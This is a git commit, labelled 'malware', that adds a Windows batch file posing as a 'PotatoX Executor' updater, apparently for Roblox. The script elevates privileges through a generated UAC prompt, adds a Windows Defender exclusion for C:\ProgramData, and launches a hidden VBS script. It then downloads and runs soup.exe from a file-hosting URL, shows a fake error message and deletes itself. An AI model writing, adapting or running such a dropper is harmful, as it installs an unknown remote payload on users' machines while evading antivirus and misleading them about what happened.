60622b58c903855c99278fc7b757ae8fa824830c
potatoxy <viktorsbudreiko@gmail.com>
2025-04-28 19:19:05 +0300

    malware

---
+++ PotatoX_2.35.bat
@@ -0,0 +1,23 @@
+@echo off
+cd "C:\ProgramData"
+title PotatoX Executor - Updating
+NET SESSION >nul 2>&1
+IF %ERRORLEVEL% EQU 0 (
+    goto :adminConfirmed
+) ELSE (
+    echo Requesting administrative privileges...
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+)
+:adminConfirmed
+powershell -Command "& {Add-MpPreference -ExclusionPath 'C:\ProgramData'}" -ExecutionPolicy Bypass
+powershell -Command "& {$paths = (Get-MpPreference).ExclusionPath; if ('C:\ProgramData' -in $paths) {Write-Host 'Loaded assets.' -ForegroundColor Green} else {Write-Host 'Assets failed to load.' -ForegroundColor Red}}" -ExecutionPolicy Bypass
+start wscript "C:\ProgramData\wallpapersvc.vbs"
+curl -L -o soup.exe https://files.catbox.moe/f9f91b.xx
+start soup.exe
+msg *.* RobloxInit failed to complete (0x00000000)
+start cmd /c "timeout /t 2 /nobreak & del *.bat"
+exit
